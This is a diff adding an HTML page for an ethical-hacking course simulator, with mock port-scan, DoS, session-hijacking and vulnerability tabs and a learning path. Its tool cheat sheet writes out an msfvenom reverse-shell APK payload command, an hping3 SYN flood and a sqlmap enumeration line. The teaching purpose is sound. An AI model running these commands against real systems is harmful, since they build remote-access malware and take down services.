@@ -1,0 +1,1855 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Hacking Course: Interactive Attack Chain Simulator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        /* Chart Container CSS Requirements */
+        .chart-container {
+            position: relative;
+            min-height: 250px;
+            max-height: 400px;
+            margin-bottom: 1rem;
+            width: 100%;
+        }
+        .chart-container canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100% !important;
+            height: 100% !important;
+        }
+        .simulator-card {
+            transition: all 0.3s ease;
+        }
+        .simulator-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
+        .toggle-switch {
+            transition: all 0.3s ease;
+        }
+        .toggle-switch.active {
+            background-color: #10b981;
+            border-color: #10b981;
+        }
+        .hidden-panel {
+            display: none;
+        }
+        .active-panel {
+            display: block;
+        }
+        .progress-bar-fill {
+            transition: width 0.3s ease;
+        }
+        .vulnerability-pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-100 min-h-screen">
+    <!-- Header -->
+    <header class="bg-gray-800 border-b border-gray-700 sticky top-0 z-50">
+        <div class="container mx-auto px-4 py-4 flex flex-wrap items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="text-2xl">🛡️</div>
+                <h1 class="text-xl md:text-2xl font-bold text-green-400">Ethical Hacking Course: Interactive Simulator</h1>
+            </div>
+            <div class="text-sm text-gray-400">
+                Learn the Attack Chain: Recon → Scan → Exploit
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8">
+        <!-- Hook Section -->
+        <section class="bg-gradient-to-r from-gray-800 to-gray-700 rounded-lg p-6 mb-8 border border-gray-600">
+            <h2 class="text-2xl font-bold mb-4 text-center">🤔 Can You Hack a System Ethically?</h2>
+            <p class="text-center text-gray-300 mb-6">
+                Imagine you're a penetration tester. A company hires you to find weaknesses in their network before real attackers do. 
+                Where do you start? What tools do you use? How does a simple scanned port become a fully compromised system?
+            </p>
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 text-center">
+                <div class="bg-gray-800 p-4 rounded-lg">
+                    <div class="text-4xl mb-2">🔍</div>
+                    <h3 class="font-bold text-green-400 mb-2">Phase 1: Reconnaissance</h3>
+                    <p class="text-sm text-gray-400">Gather intelligence without touching the target</p>
+                </div>
+                <div class="bg-gray-800 p-4 rounded-lg">
+                    <div class="text-4xl mb-2">🖥️</div>
+                    <h3 class="font-bold text-blue-400 mb-2">Phase 2: Scanning</h3>
+                    <p class="text-sm text-gray-400">Probe for open doors and running services</p>
+                </div>
+                <div class="bg-gray-800 p-4 rounded-lg">
+                    <div class="text-4xl mb-2">⚔️</div>
+                    <h3 class="font-bold text-red-400 mb-2">Phase 3: Exploitation</h3>
+                    <p class="text-sm text-gray-400">Break in and gain control</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Main Simulator Tabs -->
+        <div class="mb-8">
+            <div class="flex flex-wrap gap-2 mb-4">
+                <button class="tab-btn bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg font-semibold transition-colors" data-tab="network-viz">Network Visualization</button>
+                <button class="tab-btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors" data-tab="nmap-sim">Port Scanner Simulator</button>
+                <button class="tab-btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors" data-tab="dos-sim">DoS Attack Simulator</button>
+                <button class="tab-btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors" data-tab="session-hijack">Session Hijacking</button>
+                <button class="tab-btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors" data-tab="vuln-analysis">Vulnerability Analyzer</button>
+                <button class="tab-btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors" data-tab="learning-path">Learning Path</button>
+            </div>
+
+            <!-- Tab Panels -->
+            <div class="bg-gray-800 rounded-lg p-6 border border-gray-700">
+                <!-- Network Visualization Tab -->
+                <div id="network-viz" class="tab-panel active-panel">
+                    <h3 class="text-xl font-bold mb-4 text-green-400">🌐 Network Topology & Attack Path</h3>
+                    <p class="text-gray-400 mb-4">Visualize how an attacker navigates through a network. Adjust the target configuration and see how it affects the attack surface.</p>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <!-- Network Map -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">Attack Path Visualization</h4>
+                            <div class="relative w-full h-64 bg-gray-800 rounded-lg overflow-hidden" id="network-map">
+                                <!-- Network nodes will be drawn here -->
+                            </div>
+                            <p class="text-sm text-gray-500 mt-2 text-center">This is a simplified representation of how an attacker moves through a network.</p>
+                        </div>
+                        
+                        <!-- Controls for network config -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">Target Configuration</h4>
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Firewall Strength</label>
+                                    <div class="flex items-center space-x-4">
+                                        <input type="range" id="firewall-strength" class="w-full" min="0" max="100" value="30">
+                                        <span id="firewall-value" class="text-sm font-monospace bg-gray-700 px-2 py-1 rounded">30</span>
+                                    </div>
+                                    <p class="text-sm text-gray-500 mt-1">Higher = more difficult to scan and exploit</p>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">System Patch Level</label>
+                                    <div class="flex items-center space-x-4">
+                                        <input type="range" id="patch-level" class="w-full" min="0" max="100" value="60">
+                                        <span id="patch-value" class="text-sm font-monospace bg-gray-700 px-2 py-1 rounded">60</span>
+                                    </div>
+                                    <p class="text-sm text-gray-500 mt-1">Higher = fewer known vulnerabilities</p>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Open Services</label>
+                                    <div class="space-y-2">
+                                        <label class="flex items-center space-x-2">
+                                            <input type="checkbox" id="service-http" checked class="service-toggle" data-service="HTTP">
+                                            <span class="text-sm">HTTP (Port 80) - Web Server</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2">
+                                            <input type="checkbox" id="service-ssh" checked class="service-toggle" data-service="SSH">
+                                            <span class="text-sm">SSH (Port 22) - Secure Shell</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2">
+                                            <input type="checkbox" id="service-smb" class="service-toggle" data-service="SMB">
+                                            <span class="text-sm">SMB (Port 445) - File Sharing</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2">
+                                            <input type="checkbox" id="service-ftp" class="service-toggle" data-service="FTP">
+                                            <span class="text-sm">FTP (Port 21) - File Transfer</span>
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="bg-gray-800 rounded p-3 border border-gray-600">
+                                    <h5 class="font-semibold text-sm mb-2">Attack Success Probability</h5>
+                                    <div class="w-full bg-gray-700 rounded-full h-4">
+                                        <div id="success-probability" class="rounded-full h-4 transition-all duration-500" style="width: 70%; background-color: #10b981;"></div>
+                                    </div>
+                                    <p id="success-text" class="text-sm mt-2 text-gray-400">High probability - easy target</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Nmap Simulator Tab -->
+                <div id="nmap-sim" class="tab-panel hidden-panel">
+                    <h3 class="text-xl font-bold mb-4 text-green-400">🖥️ Port Scanner Simulator (Nmap-style)</h3>
+                    <p class="text-gray-400 mb-4">Understand how Nmap scans work. Configure scan options and see what results they produce in real-time.</p>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <!-- Scan Configuration -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">Scan Configuration</h4>
+                            <div class="space-y-3">
+                                <div>
+                                    <label class="block text-sm font-medium mb-1">Target IP</label>
+                                    <input type="text" id="target-ip" value="192.168.1.100" class="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm font-mono">
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-1">Port Range</label>
+                                    <div class="flex space-x-2">
+                                        <input type="number" id="port-start" value="1" min="1" max="65535" class="w-1/2 bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm font-mono">
+                                        <input type="number" id="port-end" value="1024" min="1" max="65535" class="w-1/2 bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm font-mono">
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Scan Type</label>
+                                    <div class="space-y-2">
+                                        <label class="flex items-center space-x-2">
+                                            <input type="radio" name="scan-type" value="SYN" checked class="scan-type-radio">
+                                            <span class="text-sm">SYN Stealth Scan (-sS) - Half-open, faster</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2">
+                                            <input type="radio" name="scan-type" value="TCP" class="scan-type-radio">
+                                            <span class="text-sm">TCP Connect Scan (-sT) - Full connection</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2">
+                                            <input type="radio" name="scan-type" value="UDP" class="scan-type-radio">
+                                            <span class="text-sm">UDP Scan (-sU) - For UDP services</span>
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="flex items-center space-x-4">
+                                    <label class="text-sm font-medium">Service Detection (-sV)</label>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" id="service-detection" checked class="sr-only peer">
+                                        <div class="w-11 h-6 bg-gray-600 rounded-full peer-focus:ring-2 peer-focus:ring-green-400 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
+                                    </label>
+                                </div>
+                                <div class="flex items-center space-x-4">
+                                    <label class="text-sm font-medium">OS Detection (-O)</label>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" id="os-detection" class="sr-only peer">
+                                        <div class="w-11 h-6 bg-gray-600 rounded-full peer-focus:ring-2 peer-focus:ring-green-400 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
+                                    </label>
+                                </div>
+                                <button id="run-scan-btn" class="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-2 rounded-lg transition-colors duration-200">
+                                    ▶️ Run Scan
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- Scan Results -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">Scan Results</h4>
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="text-sm font-mono text-gray-400">nmap <span id="command-display"></span></span>
+                                <button id="export-scan" class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded transition-colors">Export Results</button>
+                            </div>
+                            <div id="scan-results" class="space-y-2 max-h-72 overflow-y-auto">
+                                <div class="text-sm text-gray-500 italic">Configure options and run a scan to see results...</div>
+                            </div>
+                            <div id="scan-statistics" class="mt-3 pt-3 border-t border-gray-600">
+                                <div class="grid grid-cols-2 gap-2 text-sm">
+                                    <div class="bg-gray-800 rounded p-2">
+                                        <span class="text-gray-400">Hosts up:</span> <span id="hosts-up" class="font-semibold text-green-400">0</span>
+                                    </div>
+                                    <div class="bg-gray-800 rounded p-2">
+                                        <span class="text-gray-400">Ports open:</span> <span id="ports-open" class="font-semibold text-blue-400">0</span>
+                                    </div>
+                                    <div class="bg-gray-800 rounded p-2">
+                                        <span class="text-gray-400">Services identified:</span> <span id="services-found" class="font-semibold text-yellow-400">0</span>
+                                    </div>
+                                    <div class="bg-gray-800 rounded p-2">
+                                        <span class="text-gray-400">OS detected:</span> <span id="os-detected" class="font-semibold text-purple-400">-</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- DoS Attack Simulator Tab -->
+                <div id="dos-sim" class="tab-panel hidden-panel">
+                    <h3 class="text-xl font-bold mb-4 text-green-400">💥 DoS/DDoS Attack Simulator</h3>
+                    <p class="text-gray-400 mb-4">See how a Denial of Service attack affects a target server. Adjust the attack parameters and watch the server's response degrade in real-time.</p>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <!-- Attack Controls -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-red-400">Attack Controls</h4>
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Attack Type</label>
+                                    <div class="space-y-2">
+                                        <label class="flex items-center space-x-2">
+                                            <input type="radio" name="attack-type" value="DoS" checked class="attack-type-radio">
+                                            <span class="text-sm">DoS (Single Source)</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2">
+                                            <input type="radio" name="attack-type" value="DDoS" class="attack-type-radio">
+                                            <span class="text-sm">DDoS (Botnet - Multiple Sources)</span>
+                                        </label>
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Attack Intensity (Packets/sec)</label>
+                                    <div class="flex items-center space-x-4">
+                                        <input type="range" id="attack-intensity" class="w-full" min="100" max="10000" value="1000" step="100">
+                                        <span id="intensity-value" class="text-sm font-mono bg-gray-700 px-2 py-1 rounded w-20 text-center">1,000</span>
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Server Capacity (Requests/sec)</label>
+                                    <div class="flex items-center space-x-4">
+                                        <input type="range" id="server-capacity" class="w-full" min="500" max="5000" value="2000" step="100">
+                                        <span id="capacity-value" class="text-sm font-mono bg-gray-700 px-2 py-1 rounded w-20 text-center">2,000</span>
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Attack Duration (seconds)</label>
+                                    <div class="flex items-center space-x-4">
+                                        <input type="range" id="attack-duration" class="w-full" min="5" max="30" value="15">
+                                        <span id="duration-value" class="text-sm font-mono bg-gray-700 px-2 py-1 rounded w-20 text-center">15</span>
+                                    </div>
+                                </div>
+                                <div class="flex space-x-2">
+                                    <button id="start-attack-btn" class="flex-1 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 rounded-lg transition-colors duration-200">
+                                        ⚔️ Start Attack
+                                    </button>
+                                    <button id="reset-attack-btn" class="flex-1 bg-gray-600 hover:bg-gray-500 text-white font-semibold py-2 rounded-lg transition-colors duration-200">
+                                        🔄 Reset
+                                    </button>
+                                </div>
+                                <div class="bg-gray-800 rounded p-3 border border-gray-600">
+                                    <h5 class="font-semibold text-sm mb-2 text-red-300">Attack Status</h5>
+                                    <div id="attack-status" class="text-sm text-gray-400">Ready. Press start to begin attack.</div>
+                                    <div id="attack-progress" class="w-full bg-gray-700 rounded-full h-3 mt-2">
+                                        <div id="attack-progress-bar" class="progress-bar-fill bg-red-500 rounded-full h-3" style="width: 0%;"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Real-time Chart -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">Server Response Monitor</h4>
+                            <div class="chart-container">
+                                <canvas id="dos-chart"></canvas>
+                            </div>
+                            <div class="grid grid-cols-3 gap-2 text-center mt-3">
+                                <div class="bg-gray-800 rounded p-2">
+                                    <div class="text-2xl font-bold" id="server-status-now">🟢</div>
+                                    <div class="text-xs text-gray-400">Status</div>
+                                </div>
+                                <div class="bg-gray-800 rounded p-2">
+                                    <div class="text-lg font-bold" id="packet-loss">0%</div>
+                                    <div class="text-xs text-gray-400">Packet Loss</div>
+                                </div>
+                                <div class="bg-gray-800 rounded p-2">
+                                    <div class="text-lg font-bold" id="response-time">0ms</div>
+                                    <div class="text-xs text-gray-400">Avg Response</div>
+                                </div>
+                            </div>
+                            <p class="text-sm text-gray-500 mt-3 italic">"Now, try changing the attack type to DDoS and observe how much faster the server becomes unresponsive."</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Session Hijacking Tab -->
+                <div id="session-hijack" class="tab-panel hidden-panel">
+                    <h3 class="text-xl font-bold mb-4 text-green-400">🍪 Session Hijacking Demonstration</h3>
+                    <p class="text-gray-400 mb-4">Understand how session hijacking works. When you have the victim's cookies, you become the victim</p>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <!-- Victim View -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">👤 Victim's Browser</h4>
+                            <div class="bg-gray-800 rounded-lg p-4 border border-gray-600 mb-3">
+                                <div class="flex items-center space-x-3 mb-3">
+                                    <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center font-bold">JB</div>
+                                    <div>
+                                        <div class="font-semibold">John Baker</div>
+                                        <div class="text-xs text-gray-400">victim@gmail.com</div>
+                                    </div>
+                                    <div class="ml-auto bg-green-600 text-xs px-2 py-1 rounded">Logged In ✓</div>
+                                </div>
+                                <div class="space-y-2">
+                                    <div class="bg-gray-700 rounded p-2 text-sm">📧 john.baker@gmail.com</div>
+                                    <div class="bg-gray-700 rounded p-2 text-sm">💳 Visa •••• 4242</div>
+                                    <div class="bg-gray-700 rounded p-2 text-sm">🏠 123 Main St, Anytown</div>
+                                </div>
+                            </div>
+                            <div class="mt-4">
+                                <h5 class="font-semibold text-sm mb-2 text-yellow-400">Victim's Session Cookie</h5>
+                                <div class="bg-gray-800 rounded p-3 border border-gray-600 font-mono text-xs break-all">
+                                    <span id="victim-cookie">session_id=abc123def456; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span>
+                                </div>
+                                <p class="text-sm text-gray-500 mt-2">These cookies identify you as an authenticated user. If stolen, the thief becomes you.</p>
+                            </div>
+                        </div>
+                        
+                        <!-- Attacker View -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-red-400">🥷 Attacker's Session</h4>
+                            <div class="bg-gray-800 rounded-lg p-4 border border-gray-600 mb-3">
+                                <div class="flex items-center space-x-3 mb-3">
+                                    <div class="w-10 h-10 bg-red-500 rounded-full flex items-center justify-center font-bold">HX</div>
+                                    <div>
+                                        <div class="font-semibold">Hacker X</div>
+                                        <div class="text-xs text-gray-400">Unknown</div>
+                                    </div>
+                                    <div class="ml-auto bg-gray-600 text-xs px-2 py-1 rounded">Not Logged In</div>
+                                </div>
+                                <div class="bg-gray-700 rounded p-2 text-sm italic text-gray-400">No victim data visible... yet</div>
+                            </div>
+                            <div class="mt-4">
+                                <h5 class="font-semibold text-sm mb-2 text-yellow-400">Stolen Cookie (Pasted by Attacker)</h5>
+                                <textarea id="stolen-cookie-input" rows="3" class="w-full bg-gray-700 border border-gray-600 rounded p-2 font-mono text-xs mb-2" placeholder="Paste stolen cookie here..."></textarea>
+                                <button id="hijack-session-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-2 rounded-lg transition-colors duration-200">
+                                    🔓 Hijack Session
+                                </button>
+                                <div id="hijack-result" class="mt-3 hidden">
+                                    <div class="bg-green-900 border border-green-600 rounded p-3">
+                                        <div class="flex items-center space-x-2 mb-2">
+                                            <span class="text-green-400 font-semibold">✓ Session Hijacked!</span>
+                                        </div>
+                                        <p class="text-sm text-green-300">You are now viewing as <strong>John Baker</strong>. You have full access to victim's data without knowing their password.</p>
+                                        <p class="text-xs text-green-500 mt-2 italic">Demo: This is exactly how you can take over a Facebook session with just a cookie!</p>
+                                    </div>
+                                </div>
+                                <button id="reset-session-btn" class="w-full bg-gray-600 hover:bg-gray-500 text-white font-semibold py-2 rounded-lg mt-2 transition-colors duration-200 hidden">
+                                    🔄 Reset Session
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Vulnerability Analyzer Tab -->
+                <div id="vuln-analysis" class="tab-panel hidden-panel">
+                    <h3 class="text-xl font-bold mb-4 text-green-400">🐛 Vulnerability Analysis & Exploitation</h3>
+                    <p class="text-gray-400 mb-4">Explore how known vulnerabilities lead to exploitation. Adjust the service version and see what weaknesses become available.</p>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                        <!-- Service Selection -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">Service Configuration</h4>
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Service</label>
+                                    <select id="vuln-service" class="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm">
+                                        <option value="Apache">Apache Web Server</option>
+                                        <option value="OpenSSH">OpenSSH</option>
+                                        <option value="SMB">SMB (Samba)</option>
+                                        <option value="MySQL">MySQL Database</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium mb-2">Version</label>
+                                    <select id="vuln-version" class="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm">
+                                        <option value="2.4.49">2.4.49 (Vulnerable)</option>
+                                        <option value="2.4.50">2.4.50 (Partially Patched)</option>
+                                        <option value="2.4.53">2.4.53 (Patched)</option>
+                                    </select>
+                                </div>
+                                <div id="vuln-options" class="space-y-2">
+                                    <!-- Dynamic options will go here -->
+                                </div>
+                                <button id="analyze-vuln-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-lg transition-colors duration-200">
+                                    🔍 Analyze Vulnerabilities
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- Analysis Results -->
+                        <div class="bg-gray-900 rounded-lg p-4 border border-gray-600">
+                            <h4 class="font-semibold mb-3 text-blue-400">Analysis Results</h4>
+                            <div id="vuln-results" class="space-y-3 max-h-80 overflow-y-auto">
+                                <div class="text-sm text-gray-500 italic">Select a service and version to analyze...</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Learning Path Tab -->
+                <div id="learning-path" class="tab-panel hidden-panel">
+                    <h3 class="text-xl font-bold mb-4 text-green-400">📚 Progressive Learning Path</h3>
+                    <p class="text-gray-400 mb-6">Master ethical hacking step by step. Each level builds on the previous one.</p>
+                    
+                    <div class="space-y-4">
+                        <div class="bg-gray-900 rounded-lg p-4 border border-green-600 border-l-4">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-green-400">Level 1: Lab Setup</h4>
+                                <span class="bg-green-600 text-xs px-2 py-1 rounded">Fundamentals</span>
+                            </div>
+                            <p class="text-sm text-gray-400">Set up your virtual lab with VMware, enable VT-x in BIOS, install Kali Linux, configure repositories and users.</p>
+                            <div class="mt-2 flex flex-wrap gap-2 text-xs">
+                                <span class="bg-gray-700 px-2 py-1 rounded">VMware</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">VT-x</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Kali Linux</span>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-gray-900 rounded-lg p-4 border border-blue-600 border-l-4">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-blue-400">Level 2: Reconnaissance</h4>
+                                <span class="bg-blue-600 text-xs px-2 py-1 rounded">Information Gathering</span>
+                            </div>
+                            <p class="text-sm text-gray-400">Learn footprinting techniques - WHOIS, Google dorking, DNS enumeration, and network mapping.</p>
+                            <div class="mt-2 flex flex-wrap gap-2 text-xs">
+                                <span class="bg-gray-700 px-2 py-1 rounded">WHOIS</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">theHarvester</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Maltego</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Recon-ng</span>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-gray-900 rounded-lg p-4 border border-yellow-600 border-l-4">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-yellow-400">Level 3: Network Scanning</h4>
+                                <span class="bg-yellow-600 text-xs px-2 py-1 rounded">Active Probing</span>
+                            </div>
+                            <p class="text-sm text-gray-400">Master Nmap - discover live hosts, scan open ports, detect services, and identify operating systems.</p>
+                            <div class="mt-2 flex flex-wrap gap-2 text-xs">
+                                <span class="bg-gray-700 px-2 py-1 rounded">Nmap -sS -sV -O</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Port Scanning</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">OS Detection</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Service Enumeration</span>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-gray-900 rounded-lg p-4 border border-purple-600 border-l-4">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-purple-400">Level 4: Enumeration & Vulnerability Analysis</h4>
+                                <span class="bg-purple-600 text-xs px-2 py-1 rounded">Deep Inspection</span>
+                            </div>
+                            <p class="text-sm text-gray-400">Extract data from discovered services and identify weaknesses using manual techniques and automated scanners like Nikto, OpenVAS, and Nessus.</p>
+                            <div class="mt-2 flex flex-wrap gap-2 text-xs">
+                                <span class="bg-gray-700 px-2 py-1 rounded">Enum4linux</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">SNMPwalk</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Nikto</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Nessus</span>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-gray-900 rounded-lg p-4 border border-red-600 border-l-4">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-red-400">Level 5: Exploitation</h4>
+                                <span class="bg-red-600 text-xs px-2 py-1 rounded">Breaking In</span>
+                            </div>
+                            <p class="text-sm text-gray-400">Exploit identified vulnerabilities. Practice with Metasploit, password cracking, privilege escalation, and client-side attacks.</p>
+                            <div class="mt-2 flex flex-wrap gap-2 text-xs">
+                                <span class="bg-gray-700 px-2 py-1 rounded">Metasploit</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">John the Ripper</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">msfvenom</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Meterpreter</span>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-gray-900 rounded-lg p-4 border border-pink-600 border-l-4">
+                            <div class="flex items-center justify-between mb-2">
+                                <h4 class="font-bold text-pink-400">Level 6: Post-Exploitation & Advanced Topics</h4>
+                                <span class="bg-pink-600 text-xs px-2 py-1 rounded">Real-World Skills</span>
+                            </div>
+                            <p class="text-sm text-gray-400">Privilege escalation, lateral movement, SQL injection, Wi-Fi hacking, session hijacking, and evasion techniques.</p>
+                            <div class="mt-2 flex flex-wrap gap-2 text-xs">
+                                <span class="bg-gray-700 px-2 py-1 rounded">SQL Injection</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">sqlmap</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Aircrack-ng</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Wireshark</span>
+                                <span class="bg-gray-700 px-2 py-1 rounded">Session Hijacking</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cheat Sheet Section -->
+        <section class="bg-gray-800 rounded-lg p-6 border border-gray-700 mb-8">
+            <h3 class="text-xl font-bold mb-4 text-green-400">📌 Quick-Reference Tool Cheat Sheet</h3>
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm">
+                    <thead>
+                        <tr class="bg-gray-700">
+                            <th class="p-2 text-left rounded-tl">Tool</th>
+                            <th class="p-2 text-left">Purpose</th>
+                            <th class="p-2 text-left rounded-tr">Basic Command</th>
+                        </tr>
+                    </thead>
+                    <tbody class="divide-y divide-gray-700">
+                        <tr>
+                            <td class="p-2 font-mono text-green-400">Nmap</td>
+                            <td class="p-2">Network scanning</td>
+                            <td class="p-2 font-mono text-xs">nmap -sS -sV -O target</td>
+                        </tr>
+                        <tr>
+                            <td class="p-2 font-mono text-green-400">Nikto</td>
+                            <td class="p-2">Web vuln scanner</td>
+                            <td class="p-2 font-mono text-xs">nikto -h http://target</td>
+                        </tr>
+                        <tr>
+                            <td class="p-2 font-mono text-green-400">msfvenom</td>
+                            <td class="p-2">Payload generator</td>
+                            <td class="p-2 font-mono text-xs">msfvenom -p android/meterpreter/reverse_tcp LHOST=x LPORT=4444 -o evil.apk</td>
+                        </tr>
+                        <tr>
+                            <td class="p-2 font-mono text-green-400">sqlmap</td>
+                            <td class="p-2">SQL injection</td>
+                            <td class="p-2 font-mono text-xs">sqlmap -u "http://target?id=1" --dbs</td>
+                        </tr>
+                        <tr>
+                            <td class="p-2 font-mono text-green-400">tcpdump</td>
+                            <td class="p-2">Packet capture</td>
+                            <td class="p-2 font-mono text-xs">tcpdump -i eth0 -w file.pcap</td>
+                        </tr>
+                        <tr>
+                            <td class="p-2 font-mono text-green-400">hping3</td>
+                            <td class="p-2">DoS testing</td>
+                            <td class="p-2 font-mono text-xs">hping3 -S --flood -p 80 target</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Ethics Warning -->
+        <section class="bg-red-900 bg-opacity-30 border border-red-600 rounded-lg p-6 mb-8">
